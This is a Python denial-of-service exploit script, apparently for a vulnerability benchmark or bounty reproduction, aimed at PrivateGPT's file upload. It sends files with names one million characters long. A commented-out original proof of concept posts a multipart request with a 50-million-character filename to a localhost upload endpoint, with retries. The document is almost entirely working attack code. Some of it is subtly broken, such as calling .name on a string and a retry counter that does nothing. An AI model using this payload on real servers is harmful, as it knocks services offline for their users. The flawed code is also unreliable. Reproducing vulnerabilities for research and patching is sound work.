import requests
import sys
import os
from pathlib import Path
from ui import PrivateGptUi

sys.path.insert(0, os.path.abspath("../../../codebase/private_gpt"))

# Instantiate the PrivateGptUi class
ui_instance = PrivateGptUi()

# Simulate uploading file with excessively long filenames
def exploit_dos():
    print("Starting DoS exploit...")

    # Generate a large file with very long filenames
    long_filename = "A" * 1_000_000  # 1 million characters
    file_path = f"{long_filename}_.txt"

     # Simulate uploading the file
    retry_count = 0
    retries_max = 5
    for retry_count in range(retries_max):
        try:
            ui_instance._upload_file([str(file_path)])
            print(f"Uploaded file: {file_path.name}")
        except Exception as e:
            print(f"Failed to upload file: {e}")
            retry_count += 1

# Execute the exploit
if __name__ == "__main__":
    exploit_dos()

# In comments below is the original poc from https://huntr.com/bounties/7db0091f-cb53-4cde-aad7-7ce491dfd8d9 
"""
# Define the target URL
url = 'http://localhost:8001/upload'

# Create a very large filename string
large_filename = '5' * 50000000

# Define the multipart boundary
boundary = '---------------------------19593077402822629586737360924'

# Create the payload for the multipart form-data
payload = (
    f'--{boundary}\r\n'
    'Content-Disposition: form-data; name="files"; '
    f'filename="{large_filename}"\r\n'
    'Content-Type: text/html\r\n\r\n'
    'test\r\n'
    f'--{boundary}--\r\n'
)

# Define the headers
headers = {
    'Content-Type': f'multipart/form-data; boundary={boundary}',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Priority': 'u=4',
}

# Added retry logic to handle network errors
retry_count = 0
retry_limit = 5

while retry_count < retry_limit:
    try:
        # Send the POST request with the large filename
        response = requests.post(url, headers=headers, data=payload)

        # Print the response status code
        print(f'Response Status Code: {response.status_code}')
        print(f'Response Body: {response.text}')
        retry_count += 1
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        retry_count += 1
    else:
        break
"""